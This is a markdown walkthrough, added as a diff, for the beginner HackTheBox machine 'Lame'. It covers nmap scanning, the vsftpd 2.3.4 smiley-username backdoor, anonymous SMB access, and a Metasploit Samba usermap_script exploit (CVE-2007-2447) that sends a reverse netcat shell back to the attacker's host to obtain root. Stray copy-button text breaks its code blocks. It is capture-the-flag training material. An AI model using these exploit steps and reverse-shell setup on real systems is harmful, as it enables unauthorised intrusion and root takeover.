@@ -1,0 +1,102 @@
+# 🐌 Lame - HackTheBox Walkthrough
+
+**Lame** is one of the first beginner-level Linux machines on HackTheBox. It demonstrates classic service enumeration and exploitation using well-known vulnerabilities in SMB and VSFTPD.
+
+---
+
+## 🛰️ Target Info
+
+- **Machine Name:** Lame
+- **IP Address:** `10.129.1.5` *(example)*
+- **Difficulty:** Easy
+- **Operating System:** Linux
+- **Goal:** Get the user and root flags
+
+---
+
+## 🔎 Reconnaissance
+
+### 🔍 Nmap Scan
+
+```bash
+nmap -sC -sV -Pn -oN lame.nmap 10.129.1.5
+Open Ports:
+
+arduino
+Copy
+Edit
+21/tcp   open  ftp       vsftpd 2.3.4
+22/tcp   open  ssh       OpenSSH 4.7p1
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+📂 Enumeration
+1. 🧬 FTP - vsftpd 2.3.4 (Backdoor Vulnerability)
+This version has a malicious backdoor triggered by using a :) smiley in the username.
+
+🔥 Exploit:
+bash
+Copy
+Edit
+telnet 10.129.1.5 21
+# USER anything:)
+# PASS whatever
+✅ A reverse shell may be triggered — but often unreliable.
+
+2. 🛠️ SMB - Using Nmap Scripts
+bash
+Copy
+Edit
+nmap --script smb-enum-shares.nse,smb-enum-users.nse -p 445 10.129.1.5
+OR try SMB client:
+
+bash
+Copy
+Edit
+smbclient -L \\\\10.129.1.5\\
+Anonymous login works:
+
+bash
+Copy
+Edit
+smbclient \\\\10.129.1.5\\tmp
+Use get/put/ls to interact with shares.
+
+💥 Exploitation - Samba (CVE-2007-2447)
+The real entry is through Samba usermap script vulnerability.
+
+🔧 Metasploit Method:
+bash
+Copy
+Edit
+msfconsole
+use exploit/multi/samba/usermap_script
+
+set RHOSTS 10.129.1.5
+set RPORT 139
+set SMBUSER ''    # blank
+set SMBDOMAIN ''  # blank
+set PAYLOAD cmd/unix/reverse_netcat
+set LHOST <your-ip>
+set LPORT 4444
+run
+💥 You get a shell as root!
+
+🏁 Flags
+👤 User Flag
+bash
+Copy
+Edit
+cat /home/makis/user.txt
+👑 Root Flag
+bash
+Copy
+Edit
+cat /root/root.txt
+📌 Key Takeaways
+Service	Vuln	CVE/Exploit
+FTP	vsftpd 2.3.4	Backdoor triggered via username :)
+SMB	Samba < 3.0.20	CVE-2007-2447 – Usermap Script RCE
+
+Legacy services like Samba/FTP are common CTF entry points.
+
+Always test smbclient with anonymous login.
